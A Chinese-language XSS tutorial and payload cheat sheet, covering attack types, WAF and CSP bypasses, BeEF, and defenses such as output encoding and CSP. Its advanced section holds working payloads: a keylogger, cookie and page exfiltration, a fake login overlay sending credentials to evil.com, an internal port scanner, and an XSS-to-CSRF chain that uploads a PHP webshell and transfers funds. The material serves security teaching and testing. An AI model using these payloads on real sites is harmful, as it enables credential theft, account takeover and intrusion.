# 🎯 XSS（跨站脚本攻击）全技巧

> **OWASP Top 10 2021 — A03: Injection（注入）**
> **XSS（Cross-Site Scripting）** 是一种将恶意脚本注入到 Web 页面中，当其他用户访问时执行该脚本的攻击方式。
> 关联：[SQL注入全技巧](09-sql-injection.md) | [命令注入全技巧](11-command-injection.md) | [NoSQL注入全技巧](10-nosql-injection.md) | [XSS实战思路之打击灰黑产1](57-xss-real-world.md)

---

## 📖 一、XSS 基础原理

### 1.1 什么是 XSS？

攻击者向目标网站注入可执行的 JavaScript 代码，当其他用户浏览该页面时，代码在用户浏览器中执行。

**攻击示例：** 一个搜索框将输入直接回显到页面：

```html
<!-- 正常输入：hello → 页面显示 -->
<p>您搜索的关键词：hello</p>

<!-- 恶意输入：<script>alert('XSS')</script>  → 页面显示 -->
<p>您搜索的关键词：<script>alert('XSS')</script></p>
<!-- ✅ 脚本被执行，弹出对话框 -->
```

### 1.2 XSS 的危害

| 危害类型 | 说明 |
|:---|:---|
| 🍪 **Cookie 劫持** | 窃取用户 Session，冒充用户登录 |
| 📝 **键盘记录** | 记录用户输入的所有内容（密码、银行卡号等） |
| 🔄 **页面篡改** | 修改页面内容，插入钓鱼表单 |
| 🕸️ **内网扫描** | 利用用户浏览器扫描内网 |
| 📎 **CSRF 组合** | 配合 CSRF 执行未授权操作 |
| 🦠 **XSS 蠕虫** | 自动传播，感染其他用户（如百度贴吧、Samy蠕虫） |

> 💡 XSS 的本质是 **"数据" 被当作 "代码" 执行**——用户输入的数据没有被正确地转义或过滤。

### 1.3 XSS 三种类型对比

| 类型 | 存储型（Persistent） | 反射型（Reflected） | DOM型（DOM-based） |
|:---|:---|:---|:---|
| **存储位置** | 服务器数据库 | 不存储，URL/请求中 | 只存在于前端 DOM 中 |
| **触发方式** | 用户访问含恶意内容的页面 | 点击恶意链接 | 前端 JS 动态处理 URL 参数 |
| **持久性** | ✅ 永久存在 | ❌ 一次性 | ❌ 一次性 |
| **危害范围** | 🔴 所有访问该页面的用户 | 🟡 点击链接的用户 | 🟡 受影响的用户 |
| **绕过难度** | 低（但危害最大） | 中 | 高（前端逻辑复杂） |

---

## 🏷️ 二、反射型 XSS（Reflected XSS）

### 2.1 原理

恶意脚本**不存储在服务器**，而是在 URL 参数中，用户点击恶意链接后触发。

**经典案例：搜索反射**

```http
GET /search?q=<script>alert('XSS')</script> HTTP/1.1
Host: target.com
```

服务器响应：
```html
<p>您搜索的关键词：<script>alert('XSS')</script></p>
```

### 2.2 利用场景

```html
<!-- 构造钓鱼链接 -->
<a href="https://bank.com/transfer?to=attacker&amount=9999&callback=<script src='http://evil.com/steal.js'></script>">
  点击领取优惠券！
</a>

<!-- URL 伪装 -->
https://bank.com/transfer?...%3C%73%63%72%69%70%74%3E... <!-- URL编码 -->
https://bank.com/transfer?...%253C%2573cript... <!-- 双重编码 -->
```

### 2.3 检测方法

```html
<!-- 基础测试 -->
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>

<!-- 无需弹出，检测是否执行 -->
<script>console.log('XSS_DETECTED')</script>

<!-- 检测字符编码 -->
< > ' " & ( ) # ;
```

---

## 🏷️ 三、存储型 XSS（Stored XSS）

### 3.1 原理

恶意脚本**存储在服务器**（数据库、文件系统等），每次用户访问页面时自动执行。危害最大。

**常见注入点：**

| 功能点 | 示例 |
|:---|:---|
| 📝 **评论区** | 发表评论包含 `<script>` |
| 👤 **用户资料** | 昵称/签名处注入 |
| 📋 **留言板** | 发布内容包含恶意代码 |
| 📎 **文件上传** | SVG文件中包含 XSS |
| 📧 **邮件内容** | Web 邮件查看时触发 |

### 3.2 经典案例：Samy 蠕虫（2005）

MySpace 社交网站史上最著名的 XSS 蠕虫。Samy Kamkar 在个人资料中注入 JS，任何访问其主页的用户都会：
1. 自动将 Samy 加为好友
2. 在个人资料中复制这段恶意代码
3. 一天内感染超过 **100万** 用户

```javascript
// Samy 蠕虫的核心逻辑（简化版）
var xhr = new XMLHttpRequest();
xhr.open("POST", "/profile/update", true);
xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
xhr.send("profile_text=<script>...</script>"); // 传播自身
```

### 3.3 检测方法

```html
<!-- 在评论区/资料/留言板提交 -->
<b>test</b>
<script src="http://your-server.com/check.js"></script>
<img src=x onerror="fetch('http://your-server.com/beacon?c='+document.cookie)">

<!-- 多字段测试 -->
昵称：<img src=1 onerror=alert(1)>
签名：<svg/onload=alert(1)>
简介：<details/open/ontoggle=alert(1)>
```

---

## 🏷️ 四、DOM 型 XSS（DOM-based XSS）

### 4.1 原理

**服务器完全不参与**，恶意代码在前端 JavaScript 动态处理时被触发。纯客户端漏洞，WAF 无法检测。

**常见危险函数：**

```javascript
// 🔴 危险：直接操作 innerHTML
element.innerHTML = userInput;
element.outerHTML = userInput;

// 🔴 危险：直接插入 HTML
document.write(userInput);
document.writeln(userInput);

// 🔴 危险：eval 执行
eval(userInput);
setTimeout(userInput, 0);
setInterval(userInput, 0);

// 🔴 危险：URL 操作
location.hash = userInput;     // 通过 # 控制
location.href = userInput;     // 重定向
```

### 4.2 常见场景

```javascript
// URL 参数直接写入页面
// URL: https://target.com/#<img src=x onerror=alert(1)>

var hash = location.hash.substring(1);  // 获取 # 后的内容
document.getElementById('output').innerHTML = hash;  // ❌ 直接插入 HTML
```

```javascript
// URL 参数传给 eval
// URL: https://target.com/?callback=alert(1)

var cb = new URLSearchParams(location.search).get('callback');
eval(cb);  // ❌ 危险！
```

### 4.3 jQuery 中的危险写法

```javascript
// 🔴 危险方法
$("div").html(userInput);        // 同 innerHTML
$("div").append(userInput);      // 直接插入 HTML
$("<div>").html(userInput);      // 构造 HTML 元素

// ✅ 安全方法
$("div").text(userInput);        // 纯文本，不会执行
$("div").append(document.createTextNode(userInput));
```

### 4.4 DOM XSS 检测

```javascript
// 测试 DOM XSS
// URL 参数中传入
?q=<script>alert(1)</script>
?name=<img src=x onerror=alert(1)>
?callback=alert(document.cookie)

// 查看页面源代码，寻找危险 DOM 操作
// 搜索关键字：innerHTML, outerHTML, document.write, eval
```

---

## 🚧 五、XSS 绕过 WAF 技巧

### 5.1 标签与事件替代

```html
<!-- 基础 script 标签 -->
<script>alert(1)</script>

<!-- HTML5 新标签 -->
<video><source onerror=alert(1)>
<audio><source onerror=alert(1)>
<body onload=alert(1)>
<marquee onstart=alert(1)>
<details open ontoggle=alert(1)>

<!-- 样式标签 -->
<style onload=alert(1)>
<link rel=stylesheet href=//evil.com/xss.css>

<!-- SVG -->
<svg onload=alert(1)>
<svg/onload=alert(1)>
<svg><animate onbegin=alert(1)>
```

### 5.2 编码绕过

```html
<!-- HTML 实体编码 -->
&#60;script&#62;alert(1)&#60;/script&#62;

<!-- Unicode 编码 -->
\u003cscript\u003ealert(1)\u003c/script\u003e

<!-- Base64（利用 data: URL） -->
<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">

<!-- JS 编码 -->
<script>eval('\x61\x6c\x65\x72\x74\x28\x31\x29')</script>
<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>
```

### 5.3 标签属性绕过

```html
<!-- 利用 href 属性 -->
<a href="javascript:alert(1)">点我</a>
<a href="javascript:alert(1)">点我</a>     <!-- 空格绕过 -->
<a href="JaVaScRiPt:alert(1)">点我</a>    <!-- 大小写 -->

<!-- 利用 formaction（HTML5） -->
<button formaction="javascript:alert(1)">提交</button>
<input type="submit" formaction="javascript:alert(1)">

<!-- 利用 action -->
<form action="javascript:alert(1)"><input type=submit>
<form id=x></form><input form=x formaction="javascript:alert(1)" type=submit value=submit>
```

### 5.4 特殊字符与语法绕过

```javascript
// 没有括号执行函数
<script>alert`1`</script>           // 模板字符串
<script>alert.call`1`</script>      // .call
<script>throw 1<alert(1)</script>   // throw 语句

// 没有引号
<script>alert(1)</script>           // 数字不需要引号
<script>alert(/xss/)</script>       // 正则表达式

// 过滤括号
<script>onerror=alert;throw 1</script>
<script>onerror=eval;throw '=alert\x281\x29'</script>

// 过滤 alert
<script>prompt(1)</script>           // 改用 prompt
<script>confirm(1)</script>          // 改用 confirm
<script>print()</script>             // 打印预览
```

### 5.5 CSP 绕过技巧

```html
<!-- 如果 CSP 允许 script 标签但不允许内联 -->
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.0/angular.js"></script>
<div ng-app ng-csp ng-click="$event.view.alert(1)">点我</div>

<!-- JSONP 端点绕过 -->
<script src="https://target.com/jsonp?callback=alert(1)"></script>

<!-- 允许 CDN 时 -->
<script src="https://cdn.com/jquery/3.5.1/jquery.min.js"></script>
<!-- 利用 jQuery 执行 -->
<script>$.getScript('http://evil.com/xss.js')</script>
```

### 5.6 长度限制绕过

```html
<!-- 短 payload -->
<svg/onload=alert(1)>
<img src=x onerror=alert(1)>

<!-- 引入外部 JS -->
<script src=//x.com/a></script>
<script src=//evil.com/1></script>

<!-- 利用 location.hash 分段 -->
<!-- URL: https://target.com/#payload -->
<script>eval(location.hash.slice(1))</script>
```

---

## 🛠️ 六、XSS 利用框架与工具

### 6.1 BeEF（Browser Exploitation Framework）

```bash
# 启动 BeEF
beef-xss

# 默认访问：http://localhost:3000/ui/panel
# 默认账号：beef / beef

# 生成的 hook URL
<script src="http://your-ip:3000/hook.js"></script>

# hook 后的功能：
# - Cookie 窃取
# - 键盘记录
# - 内网探测
# - 截图
# - Metasploit 联动
```

### 6.2 XSS 平台

```html
<!-- 蓝莲花 XSS 平台 -->
<script src="http://your-server.com/xss/myjs/x.js"></script>

<!-- XSS Hunter（已关闭，可使用替代品） -->
<script src="https://js.xss.ht"></script>

<!-- Interact.sh（用于盲 XSS 检测） -->
<script>fetch('http://xxxx.interact.sh/?c='+document.cookie)</script>
```

### 6.3 自动化工具

```bash
# Dalfox - Go 语言 XSS 扫描器
dalfox url https://target.com/search?q=test
dalfox file urls.txt --found-action='echo "VULN: {{URL}}"'

# XSStrike - 先进 XSS 检测
python xsstrike.py -u "https://target.com/search?q=test"
python xsstrike.py -u "https://target.com/search?q=test" --fuzzer

# 正则表达式快速扫描
grep -rn "innerHTML\|document.write\|eval(" /path/to/source/
```

---

## 🚀 七、高阶 XSS 利用技巧

### 7.1 盲 XSS（Blind XSS）

攻击者在**攻击者无法直接看到**的页面中注入 XSS（如后台管理页面、日志页面）。

```html
<!-- 在联系表单、反馈页、日志记录处注入 -->
<script src="http://your-server.com/steal.js"></script>

<!-- steal.js 内容 -->
new Image().src = 'http://your-server.com/steal?cookie=' 
  + encodeURIComponent(document.cookie) 
  + '&url=' + encodeURIComponent(location.href)
  + '&html=' + encodeURIComponent(document.documentElement.innerHTML);

<!-- 使用 XSS Hunter 检测 -->
<script>fetch('http://xxxxx.xss.ht')</script>
```

### 7.2 Cookie 劫持与 HttpOnly 绕过

```javascript
// 无 HttpOnly → 直接读取
document.cookie

// 有 HttpOnly → 无法通过 document.cookie 读取
// 但可以：
// 1. CSRF + XSS 组合：直接发请求
fetch('/api/change_password', {method:'POST', credentials:'include', body:...})

// 2. 抓取页面内容（可能包含 CSRF Token）
fetch('/profile').then(r=>r.text()).then(t=>console.log(t))

// 3. 访问内网资源
fetch('http://192.168.1.1/admin')
```

### 7.3 键盘记录器

```javascript
// XSS 键盘记录 payload
document.addEventListener('keypress', function(e) {
    new Image().src = 'http://evil.com/log?key=' + e.key;
});

// 完整版 - 记录到表单提交
(function() {
    var keys = '';
    document.addEventListener('keydown', function(e) {
        keys += e.key;
        // 每按 10 个键发送一次
        if (keys.length >= 10) {
            new Image().src = 'http://evil.com/keys?data=' + btoa(keys);
            keys = '';
        }
    });
    // 页面关闭前发送剩余数据
    window.addEventListener('beforeunload', function() {
        new Image().src = 'http://evil.com/keys?data=' + btoa(keys);
    });
})();
```

### 7.4 端口扫描（内网探测）

```javascript
// 利用 XSS 扫描内网
function scanPort(ip, port) {
    var img = new Image();
    var start = Date.now();
    img.onload = function() { 
        // 能加载图片说明端口开放（或资源存在）
        fetch('http://evil.com/result?ip='+ip+'&port='+port+'&open=true'); 
    };
    img.onerror = function() {
        // onerror 也会在某些情况下触发
        var elapsed = Date.now() - start;
        if (elapsed > 200) { // 延迟大可能端口过滤
            fetch('http://evil.com/result?ip='+ip+'&port='+port+'&filtered='+elapsed);
        }
    };
    img.src = 'http://' + ip + ':' + port;
}

// 扫描内网常见 IP
scanPort('192.168.1.1', 80);
scanPort('10.0.0.1', 8080);
scanPort('172.16.0.1', 443);
```

### 7.5 表单劫持（Phishing via XSS）

```javascript
// 篡改登录表单，将密码发送到攻击者服务器
var loginForm = document.querySelector('form');
if (loginForm) {
    loginForm.addEventListener('submit', function(e) {
        var data = new FormData(this);
        // 将凭证发送到攻击者服务器
        fetch('http://evil.com/steal', {
            method: 'POST',
            body: data
        });
    });
}

// 或直接伪造登录框
document.body.innerHTML = '<div style="position:fixed;top:0;width:100%;height:100%;background:rgba(0,0,0,0.5);z-index:9999;">' +
    '<div style="background:white;width:400px;margin:100px auto;padding:20px;border-radius:10px;">' +
    '<h2>会话已过期，请重新登录</h2>' +
    '<form id="phishForm">' +
    '用户名：<input name="username"><br>' +
    '密码：<input type="password" name="password"><br>' +
    '<input type="submit" value="登录">' +
    '</form></div></div>';

document.getElementById('phishForm').addEventListener('submit', function(e) {
    e.preventDefault();
    var data = new FormData(this);
    fetch('http://evil.com/steal', {method:'POST', body:data});
    alert('登录成功，请刷新页面');
    document.querySelector('div[style*="fixed"]').remove();
});
```

### 7.6 MHTML / CSS Injection

```html
<!-- CSS Injection：窃取 CSRF Token -->
<style>
input[value^="a"] { background: url(http://evil.com/char=a); }
input[value^="b"] { background: url(http://evil.com/char=b); }
/* 逐字符窃取 Token */
</style>
```

### 7.7 Self-XSS 到 Stored XSS 的转化

```html
<!-- Self-XSS 虽然只有自己能看到，但结合 CSRF 可转化 -->
<!-- 管理员查看日志时触发 -->
<!-- 攻击者先触发 Self-XSS，日志记录恶意内容 -->
<!-- 管理员查看日志页面，XSS 触发 -->

<!-- 利用评论的 Self-XSS -->
<!-- 先以用户身份发评论注入 XSS -->
评论内容：<img src=x onerror="fetch('/admin/delete_user?id=10086')">
<!-- 管理员审核评论时触发 -->
```

### 7.8 XSS + CSRF 组合攻击

```javascript
// XSS 载荷自动执行 CSRF 攻击

// 1. 修改邮箱（用于重置密码）
fetch('/api/update_email', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    credentials: 'include',
    body: JSON.stringify({email: 'attacker@evil.com'})
});

// 2. 上传 webshell（如果后台有上传功能）
var formData = new FormData();
formData.append('file', new Blob(['<?php system($_GET["cmd"]);?>'], {type:'text/plain'}), 'shell.php');
fetch('/admin/upload', {method:'POST', body: formData, credentials: 'include'});

// 3. 转账
fetch('/api/transfer', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    credentials: 'include',
    body: JSON.stringify({to: 'attacker', amount: 9999})
});
```

---

## 🛡️ 八、XSS 防御方案

### 8.1 输出编码（Output Encoding）⭐

```html
<!-- HTML 上下文编码 -->
&lt; → &amp;lt;
&gt; → &amp;gt;
&quot; → &amp;quot;
&#x27; → &amp;#x27;
&amp; → &amp;amp;

<!-- JavaScript 上下文编码 -->
<script>
var x = "用户输入";  // \x27 是单引号、\x22 是双引号
</script>

<!-- URL 上下文编码 -->
<a href="javascript:...">  <!-- 禁止 javascript: 协议 -->
```

### 8.2 各语言实现

```python
# Python（Flask）
from flask import escape, Markup

@app.route('/search')
def search():
    q = request.args.get('q', '')
    # ✅ 自动 HTML 转义
    return render_template('results.html', query=q)

# 如果不转义
return Markup(f'<p>{q}</p>')  # ❌ 危险！
```

```java
// Java（JSP）
<%@ taglib prefix="c" uri="http://java.sun.com/jsp/jstl/core" %>
<c:out value="${param.q}" />  <!-- ✅ 自动转义 -->

// 或者使用 OWASP Java Encoder
import org.owasp.encoder.Encode;
out.println(Encode.forHtml(userInput));     // HTML 编码
out.println(Encode.forJavaScript(userInput)); // JS 编码
```

```javascript
// Node.js
const escapeHtml = require('escape-html');
app.get('/search', (req, res) => {
    // ✅ 输出编码
    res.send(`<p>${escapeHtml(req.query.q)}</p>`);
});

// React 默认防 XSS
function Search() {
    const [q, setQ] = useState('');
    // ✅ React 默认转义 JSX 中的所有内容
    return <p>{q}</p>;
}
```

### 8.3 Content Security Policy（CSP）

```nginx
# Nginx CSP 配置
add_header Content-Security-Policy "
    default-src 'self';
    script-src 'self' 'nonce-随机数' https://trusted-cdn.com;
    style-src 'self' 'unsafe-inline';
    img-src 'self' data:;
    object-src 'none';
    frame-ancestors 'none';
    base-uri 'none';
";

# 严格 CSP（最安全）
add_header Content-Security-Policy "
    default-src 'none';
    script-src 'nonce-随机数';
    style-src 'self';
    img-src 'self';
    connect-src 'self';
    font-src 'self';
    frame-src 'none';
    object-src 'none';
    base-uri 'none';
    form-action 'self';
";
```

### 8.4 HttpOnly Cookie

```python
# Python（Flask）
app.config.update(
    SESSION_COOKIE_HTTPONLY=True,    # ✅ 防止 JS 读取 Cookie
    SESSION_COOKIE_SECURE=True,      # ✅ 仅 HTTPS
    SESSION_COOKIE_SAMESITE='Lax'    # ✅ 防止 CSRF
)
```

```java
// Java Servlet
Cookie cookie = new Cookie("session", sessionId);
cookie.setHttpOnly(true);   // ✅ 禁止 JS 访问
cookie.setSecure(true);     // ✅ 仅 HTTPS
cookie.setPath("/");
cookie.setMaxAge(-1);
response.addCookie(cookie);
```

### 8.5 X-XSS-Protection 与 X-Content-Type-Options

```nginx
# 已废弃但仍然有用
add_header X-XSS-Protection "1; mode=block";

# 禁止 MIME 嗅探
add_header X-Content-Type-Options "nosniff";

# 禁止页面被 iframe 嵌入（防点击劫持）
add_header X-Frame-Options "SAMEORIGIN";
```

### 8.6 输入过滤（白名单方案）

```python
import re

def sanitize_input(user_input):
    """白名单：只允许字母数字和部分符号"""
    # 移除所有 HTML 标签
    clean = re.sub(r'<[^>]*>', '', user_input)
    # 移除 javascript: 协议
    clean = re.sub(r'javascript\s*:', '', clean, flags=re.IGNORECASE)
    # 只保留安全字符
    clean = re.sub(r'[^\w\s\-_.,!?@#$%^&*()\[\]{}]', '', clean)
    return clean.strip()

# ⚠️ 注意：白名单过滤只是辅助，不能替代输出编码！
```

### 8.7 安全开发指南

| 场景 | 正确做法 |
|:---|:---|
| 插入 HTML 内容 | 使用 `textContent` / `innerText` 替代 `innerHTML` |
| 插入属性值 | 使用 `setAttribute()` 替代字符串拼接 |
| 插入 URL | 严格校验协议为 `https://` |
| 插入 CSS | 只允许特定属性值（白名单） |
| 富文本编辑 | 使用 DOMPurify 等库过滤 |

```javascript
// ✅ 安全 DOM 操作
element.textContent = userInput;              // 安全
element.setAttribute('title', userInput);     // 安全（属性值已转义）
element.setAttribute('href', safeUrl);        // 对 URL 做协议校验

// ❌ 危险 DOM 操作
element.innerHTML = userInput;                // 危险
element.outerHTML = userInput;                // 危险
document.write(userInput);                    // 危险
eval(userInput);                              // 危险
setTimeout(userInput, 0);                     // 危险
```

---

## 🎯 九、XSS 检测流程

### 9.1 手动测试步骤

```mermaid
graph TD
    A[确定输入点] --> B[输入特殊字符]
    B --> C{是否被转义/过滤？}
    C -->|没有过滤| D[尝试 `<img src=x onerror=alert(1)>`]
    C -->|部分过滤| E[尝试编码/标签替代]
    D --> F{是否弹窗？}
    E --> F
    F -->|是| G[确认 XSS]
    F -->|否| H[尝试其他标签/事件]
    H --> I[查看 HTML 源码确认]
    I -->|成功| G
    I -->|失败| J[测试其他输入点]
```

### 9.2 XSS 测试 Checklist

- [ ] 所有输入点测试（搜索框、评论、用户名、URL参数、HTTP头）
- [ ] 检查反射型：URL 参数回显到页面
- [ ] 检查存储型：提交后其他用户是否能看见
- [ ] 检查 DOM 型：查看 JS 源码是否有危险函数
- [ ] 测试 WAF 绕过（编码/标签替代/大小写）
- [ ] 测试 CSP 是否严格
- [ ] 测试 HttpOnly 是否开启
- [ ] 盲 XSS 检测（后台管理页面）

### 9.3 常用测试 Payload 合集

```html
<!-- 基础测试 -->
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>

<!-- 无括号 -->
<script>alert`1`</script>

<!-- 事件 -->
<body onload=alert(1)>
<details open ontoggle=alert(1)>
<marquee onstart=alert(1)>

<!-- iframe -->
<iframe src="javascript:alert(1)">

<!-- SVG -->
<svg><script>alert(1)</script>
<svg/onload=alert(1)>
<svg><animate onbegin=alert(1)>

<!-- 编码 -->
&#60;script&#62;alert(1)&#60;/script&#62;
```

### 9.4 推荐工具

| 工具 | 用途 |
|:---|:---|
| **BeEF** | 浏览器利用框架（XSS 后利用） |
| **XSStrike** | XSS 扫描器（含 WAF 绕过） |
| **Dalfox** | 快速 XSS 扫描 |
| **Burp Suite** | 手动测试 + Intruder 模糊测试 |
| **BlueLotus XSS** | XSS 盲打平台 |

---

## 🔗 关联文件

| 文件 | 关联说明 |
|:---|:---|
| [SQL注入全技巧](09-sql-injection.md) | 同属 A03 Injection 大类 |
| [命令注入全技巧](11-command-injection.md) | 另一类注入漏洞 |
| [NoSQL注入全技巧](10-nosql-injection.md) | NoSQL 数据库注入 |
| [模板注入SSTI全技巧](17-ssti.md) | 服务器端模板注入 |
| [XXE注入全技巧](16-xxe.md) | XML 外部实体注入 |
| [XSS实战思路之打击灰黑产1](57-xss-real-world.md) | XSS 实战案例（钓鱼网站攻防） |
| [OWASP Top 10 速查表](08-owasp-top10.md) | OWASP 分类总览 |

> **💡 核心原则**：XSS 的本质是 **数据与代码未分离**。防御的关键是 **输出编码**（Output Encoding）、**CSP 策略**和 **HttpOnly Cookie**。永远不要信任用户输入，永远在输出端进行编码！
